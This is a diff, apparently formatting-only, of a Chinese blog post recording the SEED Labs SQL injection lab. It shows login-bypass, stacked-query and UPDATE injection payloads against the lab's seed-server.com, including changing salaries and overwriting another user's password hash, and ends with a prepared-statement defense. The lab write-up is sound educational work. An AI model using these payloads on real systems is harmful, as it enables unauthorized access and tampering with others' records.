@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "【SEED Labs】SQL injection"
+title:  "SQL injection"
 date:   2020-11-01 00:00:00 +0800
 categories: 实验
-tags: SEEDLab 安全
+tags: seedlab sql
 comments: 1
 mathjax: true
 copyrights: 原创
@@ -11,11 +11,11 @@ copyrights: 原创
 
 本文为 [SEED Labs 2.0 - SQL Injection Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/) 的实验记录。
 
-# 实验原理
+## 实验原理
 
 SQL注入攻击通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，它目前是黑客对数据库进行攻击的最常用手段之一。
 
-# Task 1: Get Familiar with SQL Statements
+## Task 1: Get Familiar with SQL Statements
 
 启动 docker
 
@@ -43,9 +43,9 @@ select * from credential where Name='Alice'
 
 <img src="./../assets/post/images/Oz14IRuBaf3ZENS.png" alt="image-20210722144514099" style="zoom:50%;" />
 
-# Task 2: SQL Injection Attack on SELECT Statement
+## Task 2: SQL Injection Attack on SELECT Statement
 
-## Task 2.1: SQL Injection Attack from webpage
+### Task 2.1: SQL Injection Attack from webpage
 
 打开 [seed-server.com](http://www.seed-server.com/)
 
@@ -60,13 +60,13 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
 
 我们只需要把判断 Password 的部分屏蔽即可
 
-```
+```plaintext
 admin';#
 ```
 
 <img src="./../assets/post/images/AzXs2vQFEPSoLiY.png" alt="image-20210722145300064" style="zoom:50%;" />
 
-## Task 2.2: SQL Injection Attack from command line
+### Task 2.2: SQL Injection Attack from command line
 
 转换一下 url 编码即可
 
@@ -80,7 +80,7 @@ curl 'www.seed-server.com/unsafe_home.php?username=%27%3b%23'
 
 看到已经显示了所有用户信息
 
-## Task 2.3: Append a new SQL statement
+### Task 2.3: Append a new SQL statement
 
 注入
 
@@ -92,9 +92,9 @@ Alice'; update credential set name=A where ID=1;#
 
 <img src="./../assets/post/images/EuwMNsmyAal3YjC.png" alt="image-20210722150917741" style="zoom:67%;" />
 
-# Task 3: SQL Injection Attack on UPDATE Statement
+## Task 3: SQL Injection Attack on UPDATE Statement
 
-## Task 3.1: Modify your own salary
+### Task 3.1: Modify your own salary
 
 进入 Alice 修改个人资料的页面
 
@@ -114,17 +114,17 @@ $conn->query($sql);
 
 注入
 
-```
+```plaintext
 ',salary='30000' where ID=1;#
 ```
 
 <img src="./../assets/post/images/gGiR6Q3UlqtF7Zk.png" alt="image-20210722153947448" style="zoom: 50%;" />
 
-## Task 3.2: Modify other people’s alary
+### Task 3.2: Modify other people’s alary
 
 这个和上面的几乎一模一样，比如我们把 Boby 的薪水改成 114514
 
-```
+```plaintext
 ',salary='114514' where ID=2;#
 ```
 
@@ -134,7 +134,7 @@ $conn->query($sql);
 
 <img src="./../assets/post/images/yMn3oTgsl5bmjAQ.png" alt="image-20210722154726908" style="zoom:50%;" />
 
-## Task 3.3: Modify other people’s password
+### Task 3.3: Modify other people’s password
 
 查看代码，看到密码采用的是 sha1，我们随便找个在线转换网站转换一下就好了。
 
@@ -142,7 +142,7 @@ $conn->query($sql);
 
 然后注入
 
-```
+```plaintext
 ',Password='1f82c942befda29b6ed487a51da199f78fce7f05' where ID=1;#
 ```
 
@@ -150,7 +150,7 @@ $conn->query($sql);
 
 然后现在可以用密码 `888888` 成功登录 Alice 账号。
 
-# Task 4: Countermeasure — Prepared Statement
+## Task 4: Countermeasure — Prepared Statement
 
 登录 [seed-server.com/defense](http://www.seed-server.com/defense/)
 
@@ -158,8 +158,8 @@ $conn->query($sql);
 
 ```php
 $stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
-						FROM credential
-						WHERE name = ? and Password = ? ");
+                        FROM credential
+                        WHERE name = ? and Password = ? ");
 $stmt->bind_param("ss", $input_uname, $hashed_pwd);
 $stmt->execute();
 $stmt->bind_result($id, $name, $eid, $salary, $ssn);
@@ -172,6 +172,6 @@ $stmt->fetch();
 
 <img src="./../assets/post/images/CFiGfJ219y7SDIB.png" alt="image-20210724201943781" style="zoom:50%;" />
 
-# 实验总结
+## 实验总结
 
 实验属于最简单的 SQL injection。主要的收获在于最后一个 Task，以前只知道怎么注入，很少研究过怎么防御。
